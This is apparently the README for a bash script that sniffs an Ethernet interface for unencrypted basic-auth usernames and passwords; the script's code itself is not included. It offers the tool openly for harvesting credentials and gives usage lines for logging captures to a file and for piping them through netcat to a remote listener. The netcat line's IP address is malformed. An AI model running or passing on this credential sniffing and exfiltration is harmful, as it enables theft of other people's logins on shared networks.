# grab_pass.sh

This is a simple script that sniffs for unencrypted basic auth logins/passwords.  The only option is the ethernet device.  Example with eth0:

`bash grab_pass.sh eth0`

Now just sit back and wait.  

If you want to keep those passwords, you can always tee it to a file:

`bash grab_pass.sh eth0 | tee logins.txt`

Or you could always setup netcat to listen on a server somewhere, then pipe the results to netcat.  For example, if you had a listener on 10.0.0.4 running on port 5555, you could just run this:

`bash grab_pass.sh eth0 | nc 10.0.0.0.4 5555`
